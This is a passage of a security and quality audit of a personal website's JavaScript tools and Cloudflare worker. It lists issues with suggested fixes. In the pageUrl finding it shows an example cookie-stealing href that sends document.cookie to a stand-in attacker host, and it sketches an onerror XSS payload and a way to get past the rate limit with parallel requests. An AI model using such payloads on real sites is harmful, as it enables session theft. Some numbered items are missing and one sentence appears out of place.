### 2. Print button crashes when popup blockers are active

- **What:** `_injectPrintBtn()` calls `window.open('', '_blank')` which returns `null` when a popup blocker is enabled, then immediately calls `win.document.write(...)` — a TypeError that propagates uncaught, silently breaking the button.
- **Where:** `tool-utils.js:923–940`
- **Why it matters:** Popup blockers are enabled by default in Firefox, Safari, and many Chrome installs. Any user who clicks "Print" gets silent failure — the button appears to work but nothing happens. With no error shown to the user, they can't debug it.
- **Effort:** S
- **Suggested fix:**
  - Add a null guard immediately after line 923: `if (!win) { showError('Please allow popups from this site to print.'); return; }`
  - Wrap the rest of the block in a try/catch to handle edge cases where the window opens but writing fails.

### 5. `pageUrl` is unsanitized in the `/email-result` HTML email body

- **What:** In the `/email-result` route, the user-supplied `pageUrl` field is interpolated directly into an HTML `href` attribute (`href="${pageUrl || 'https://panoskokmotos.com'}"`) without encoding. An attacker can craft `pageUrl` to inject arbitrary HTML attributes or JavaScript pseudo-protocols.
- **Where:** `cloudflare-worker.js:246`
- **Why it matters:** While most email clients strip `<script>` tags, a crafted `href` like `javascript:fetch('https://attacker.com/'+document.cookie)` or a broken attribute that injects extra markup could be used for phishing or UI-redress in permissive email clients. The `result` field is correctly escaped (line 242) but `pageUrl` is not.
- **Effort:** S
- **Suggested fix:**
  - Validate `pageUrl` against a whitelist: `const safeUrl = (typeof pageUrl === 'string' && pageUrl.startsWith('https://panoskokmotos.com')) ? pageUrl : 'https://panoskokmotos.com';`
  - Use `safeUrl` in the template instead of the raw parameter.

The install prompt that could convert a tool user into a home-screen app user never appears. The tool pages are where the habit-building use case lives.
- **Effort:** S

### 7. Tool pages load Google Fonts synchronously — render-blocking on all 12 pages

- **What:** Every tool page uses `<link href="https://fonts.googleapis.com/css2?..." rel="stylesheet">` — a synchronous, render-blocking font load. `index.html` (line 67–68) correctly uses the async `onload` trick, but this pattern was never applied to the tool pages.
- **Where:** `what-would-x-do.html:37`, `donation-tax-estimator.html:34`, and all other tool pages (same pattern in `<head>`).
- **Why it matters:** The browser must wait for a Google Fonts CDN round-trip before painting any text. On 3G or a slow connection, this delays First Contentful Paint by 300–900ms on every tool page. CWV scores and perceived speed both suffer.
- **Effort:** S
- **Suggested fix:**
  - Replace the synchronous `<link rel="stylesheet">` with the same async pattern from `index.html:67–68`:
    ```html
    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" /></noscript>
    ```
  - Add a `<!-- include:font-preload -->` partial so this is synced via `build.py`.

### 9. In-memory rate limit resets on Cloudflare Worker cold start — ineffective under burst

- **What:** The `rateLimitStore` Map lives in worker process memory. Cloudflare Workers can run as many concurrent isolates as needed; each starts with an empty store. A user sending 20 simultaneous requests can bypass the 20 req/hour limit by simply parallelising across isolates.
- **Where:** `cloudflare-worker.js:104–124`
- **Why it matters:** The AI endpoints call Anthropic's API with your API key. Uncontrolled bursts under high traffic or an intentional abuse attempt will run up Anthropic costs without the rate limiter stopping them. For a personal site fronting a paid API, this is a real cost risk.
- **Effort:** M
- **Suggested fix:**
  - Bind a Cloudflare KV namespace (`RATE_LIMIT_KV`) and store/check `{count, resetAt}` keyed by IP there instead of in-memory.
  - Alternatively, use Cloudflare's built-in rate limiting rules in the Workers dashboard (zero code required) — set 20 req/hour per IP on the worker route.

### 10. `tool-utils.js` is a 1700-line monolith

- **What:** A single file that contains API calls, streaming logic, DOM injection for 14 UI widgets, canvas rendering, history drawer, PWA banner, voice input, charity autocomplete, keyboard shortcut modal, and offline restore. Every new tool feature is added here.
- **Where:** `tool-utils.js:1–1700`
- **Why it matters:** Any new tool feature requires reading the entire file to understand side effects. Merge conflicts on this file are inevitable as the tool count grows. The file size also means the browser must parse all 1700 lines before any tool page is interactive.

### 11. `_injectExplainTooltips` leaks a global click listener on every "?" button click

- **What:** Inside the `btn.addEventListener('click', ...)` handler, line 1495 calls `document.addEventListener('click', ..., { once: false })` — adding a permanent global listener each time the button is clicked. After 10 clicks on "?" buttons, 10 listeners fire on every global click.
- **Where:** `tool-utils.js:1495–1497`
- **Why it matters:** The listeners accumulate indefinitely in a session and can't be removed (no reference held). They're inert once `tip` is null, but each click adds more. On long sessions or power users running many queries, this is a memory leak.
- **Effort:** S
- **Suggested fix:**
  - Move the `document.addEventListener('click', ...)` outside the button click handler so it's attached once per heading during `_injectExplainTooltips`, or use an `AbortController` to remove the listener when the tooltip is closed.

### 16. `/api/v2/tool` ("Go Deeper") doesn't check `response.ok` before parsing JSON

### 17. `_injectResultExtras()` calls 14 inject functions synchronously on each result render

- **What:** `_injectResultExtras` (line 366–383) calls 14 DOM-mutating functions sequentially on the main thread — rating widget, download button, print button, share card, go-deeper button, ask-about button, confidence badge, refine input, follow-up chat, impact calculator, freshness badge, disclaimer, source links, explain tooltips. This runs inside a `setTimeout(..., 80)` callback but still blocks the main thread for the duration.
- **Where:** `tool-utils.js:366–383`
- **Why it matters:** On mid-range Android devices, 14 synchronous DOM mutations after a result appears can delay result interactivity by 100–200ms, causing a visible jank on scroll. Each function also runs a `document.getElementById` / `querySelector` guard check.
- **Effort:** S
- **Suggested fix:**
  - Batch reads first (single `querySelector` sweep), then writes. Or use a `requestIdleCallback` wrapper so the extras render after the browser has painted the result.
  - Consider lazy-initing extras only when the user scrolls past the result fold.

## 💡 P3 — Nice to have

### 18. `followUpChips.sort(() => 0.5 - Math.random())` produces a biased shuffle

- **What:** `chat.js:92` uses the array's native sort with a random comparator to shuffle follow-up chips. This pattern doesn't produce uniformly random results in V8 (and most engines) because sort algorithms require a transitive comparator; random comparators violate transitivity, causing some orderings to appear far more frequently than others.
- **Where:** `chat.js:92`
- **Why it matters:** Follow-up chips may feel repetitive to returning users — the same two chips appear most of the time. Low severity but easy to fix.
- **Effort:** S
- **Suggested fix:**
  - Replace with a Fisher-Yates shuffle: `for (let i = followUpChips.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [followUpChips[i], followUpChips[j]] = [followUpChips[j], followUpChips[i]]; }`

### 20. `_restoreOfflineResult` injects raw saved HTML without sanitization

- **What:** When offline, `_restoreOfflineResult` (line 1667) sets `body.innerHTML = saved.html` where `saved.html` is content previously stored in localStorage from a tool result. If an Anthropic response ever contained a prompt-injected XSS payload (e.g., `<img src=x onerror=...>`), it would be stored and later re-injected into the DOM on the next offline visit.
- **Where:** `tool-utils.js:1667`
- **Why it matters:** Low likelihood (requires a crafted prompt injection through Claude), but if it fires, it's XSS in the user's own browser context on a domain they trust. Defense-in-depth recommends sanitizing innerHTML from untrusted storage.
- **Effort:** S
- **Suggested fix:**
  - Use the browser's built-in `setHTML` (Sanitizer API where supported) or a lightweight sanitizer: strip `<script>` tags and `on*` attributes before setting innerHTML, e.g. `saved.html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '').replace(/\s+on\w+="[^"]*"/g, '')`.
